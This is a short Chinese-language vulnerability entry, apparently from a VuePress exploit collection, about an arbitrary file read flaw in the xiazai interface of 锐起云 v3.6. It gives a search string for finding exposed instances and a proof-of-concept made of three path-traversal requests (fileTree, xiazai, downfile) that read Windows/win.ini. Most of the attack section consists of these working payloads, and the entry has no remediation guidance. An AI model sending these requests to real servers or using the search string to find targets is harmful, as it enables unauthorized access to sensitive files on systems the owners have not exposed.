# 锐起云 xiazai 任意文件读取漏洞

## 漏洞描述

锐起云 xiazai 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>锐起云 v3.6</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"锐起云"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1692239495468-467f771d-6d80-4a09-b9a0-b2bfd3f617ab.png)

![img](../../../.vuepress/public/img/1692264395187-adcf551b-bc30-496e-925b-bd38a20716a1.png)

验证POC

```plain
/dwr/hret/fileTree?filePath=../
/dwr/srecy/xiazai?filePath=../../../../../../../../../../../Windows/win.ini
/dwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini 
```

![img](../../../.vuepress/public/img/1692264749738-c04d5539-ac64-4ffe-b790-62db0da31ba1.png)